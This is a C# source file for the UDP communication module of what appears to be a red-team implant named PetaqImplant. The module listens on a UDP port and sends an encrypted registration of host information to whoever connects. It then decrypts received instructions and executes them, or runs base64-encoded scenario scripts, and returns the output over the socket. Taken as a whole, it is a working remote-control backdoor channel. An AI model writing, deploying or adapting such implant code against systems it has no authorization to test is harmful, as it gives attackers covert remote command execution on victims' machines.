using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;

using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.IO.Pipes;
using System.Security.Principal;
using System.Security.AccessControl;

namespace PetaqImplant
{
    public class UDPServiceSocket : ImplantServiceSocket
    {
        public int ListenPort { get; set; }
        public UdpClient UDPService { get; set; }
        public IPEndPoint UDPClient { get; set; }

        public override void Start()
        {
            try
            {
                // Setting up the variables for listener
                ListenPort = int.Parse(Program.configuration["LISTENPORT"]);

                // Setting the service status
                Status = true;

                // Listener is configuring
                UDPService = new UdpClient(ListenPort);


                while (Status)
                {

                    //Console.Error.WriteLine("The EP is setting.");
                    IPEndPoint ep = new IPEndPoint(IPAddress.Any, ListenPort);

                    Console.Error.WriteLine("Waiting for linking... ");


                    // Read stream as string and process
                    while (Status)
                    {
                        // When data received, Endpoint gets updated
                        byte[] data = UDPService.Receive(ref ep);

                        // Copy the endpoint to the UDPClient to send data later
                        UDPClient = ep;

                        // Send registration info first when a socket established
                        if (! LinkStatus)
                        {
                            Console.Error.WriteLine("Registering the implant information.");
                            string registration_data = Common.Encrypt("register " + Convert.ToBase64String(Encoding.UTF8.GetBytes(Common.GetInfo())));
                            Send(registration_data);
                        }

                        // Set the link status as data received
                        LinkStatus = true;

                        ////Instruction received from the UDP client...
                        string instruction = Encoding.UTF8.GetString(data);
                        instruction = Common.Decrypt(instruction);

                        // If scenario is requested call scenario, otherwise run instructions
                        if (instruction.StartsWith("scenario"))
                        {
                            if (Regex.Split(instruction," ").Length < 3)
                            {
                                // Set the socket as the Console output
                                Program.consoleIO = Console.Out;
                                Console.SetOut(new SocketWriter());
                                // Raise the error
                                Console.WriteLine("Usage: scenario file filepath");
                            }
                            else
                            {
                                // scenario instruction format:
                                // scenario file BASE64STRING
                                string scenario_b64 = Regex.Split(instruction," ")[2];
                                // send the Base64 encoded scenario to run
                                PetaqImplant.Scenario.Run(scenario_b64);
                            }

                        }
                        else
                        {
                            // run the instruction received
                            PetaqImplant.Instructions.Instruct(instruction, new SocketWriter());
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("UDP Service Exception on Receive: " + e.Message);
                Status = false;
                LinkStatus = false;
            }
            finally
            {
                Stop();
            }
        }

        public override void Stop()
        {

            // Stop listening for new clients.
            //if (LinkStatus)
            //{
            //    Console.Error.WriteLine("Closing the UDP linking.");
            //    UDPClient.Close();
            //}
            Console.Error.WriteLine("Stopping the UDP linking service.");
            UDPService.Close();
            Status = false;
            LinkStatus = false;

        }
        public override bool Send(string data = "")
        {
            if (data == "") return false;
            try
            {

                if (LinkStatus)
                {
                    byte[] databytes = Encoding.UTF8.GetBytes(data);
                    Console.Error.WriteLine("Data is sending to {0}:{1}",UDPClient.Address,UDPClient.Port);
                    UDPService.Send(databytes, databytes.Length, UDPClient);
                }
                else
                {
                    Console.Error.WriteLine("The UDP service is not linked.");
                }
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("UDP Service Exception on Send: " + e.Message + e.StackTrace);
                return false;
            }
        }
    }
}
